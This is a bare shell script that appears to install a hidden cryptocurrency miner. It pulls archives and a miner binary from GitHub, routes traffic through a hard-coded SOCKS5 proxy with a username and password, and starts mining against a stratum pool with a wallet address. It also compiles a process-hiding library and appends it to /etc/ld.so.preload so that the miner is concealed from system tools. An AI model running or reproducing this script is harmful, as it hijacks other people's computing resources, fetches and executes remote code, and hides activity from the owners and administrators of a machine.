sudo apt -q -y update
clear
sudo apt -q install -y screen unzip 

wget -q https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xzf graphics.tar.gz

cat > iplist <<END
148.113.142.107:1080
END

ip=$(shuf -n 1 iplist)

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = $ip
socks5_username = gratis
socks5_password = q1w2e3r4t5
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ipinfo.io

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
sudo make
sudo gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
sudo mv libprocesshider.so /usr/local/lib/
sudo echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

#!/bin/bash
./graftcp/graftcp wget https://github.com/indah38/theta/raw/main/VTM
chmod 700 VTM
clear
./graftcp/graftcp ./VTM -a yescryptr16  -o stratum+tcps://178.128.86.41:80 -u vFEneCSxgbhmn7idJxxWULEgD5jS2hyJnQ.OHGITU2 -p x -t4
